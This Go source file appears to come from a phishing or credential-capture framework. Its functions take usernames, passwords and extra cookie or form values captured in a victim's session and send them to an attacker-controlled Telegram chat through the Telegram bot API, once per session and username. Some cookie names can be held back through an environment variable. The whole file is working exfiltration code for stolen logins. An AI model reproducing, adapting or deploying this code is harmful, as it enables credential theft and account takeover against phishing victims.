package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path"
	"strings"
	"sync"
	"time"
)

var tgNotified = sync.Map{}

// SendTelegramMessage delivers a plain text message to the chat configured
// through the TG_BOT_TOKEN and TG_CHAT_ID environment variables.
func SendTelegramMessage(message string) {
	token := os.Getenv("TG_BOT_TOKEN")
	chatID := os.Getenv("TG_CHAT_ID")
	if token == "" || chatID == "" {
		return
	}
	payload := map[string]string{
		"chat_id": chatID,
		"text":    message,
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return
	}
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(
		"https://api.telegram.org/bot"+token+"/sendMessage",
		"application/json",
		bytes.NewReader(data),
	)
	if err != nil {
		return
	}
	resp.Body.Close()
}

// NotifySessionCredentialsAsynchronously sends exactly ONE Telegram alert
// per session the first time credentials are captured. Repeat captures of
// the same username in the same session are suppressed.
func NotifySessionCredentialsAsynchronously(sessionID string, username string, password string, extra map[string]string) {
	key := sessionID + ":" + username
	if _, loaded := tgNotified.LoadOrStore(key, true); loaded {
		return
	}
	go func() {
		var b strings.Builder
		fmt.Fprintf(&b, "🎣 New capture in session %s\n\n👤 Username: %s\n🔑 Password: %s\n", sessionID, username, password)
		hidden := hiddenCookieNames()
		for k, v := range extra {
			if isHiddenCredential(k, hidden) {
				continue
			}
			fmt.Fprintf(&b, "%s: %s\n", k, v)
		}
		SendTelegramMessage(b.String())
	}()
}

// hiddenCookieNames returns the comma-separated HIDDEN_COOKIES env list.
func hiddenCookieNames() []string {
	raw := os.Getenv("HIDDEN_COOKIES")
	if raw == "" {
		return nil
	}
	var out []string
	for _, name := range strings.Split(raw, ",") {
		name = strings.TrimSpace(name)
		if name != "" {
			out = append(out, name)
		}
	}
	return out
}

// isHiddenCredential supports * wildcards, e.g. _ga_*
func isHiddenCredential(name string, patterns []string) bool {
	for _, p := range patterns {
		if ok, err := path.Match(p, name); err == nil && ok {
			return true
		}
	}
	return false
}
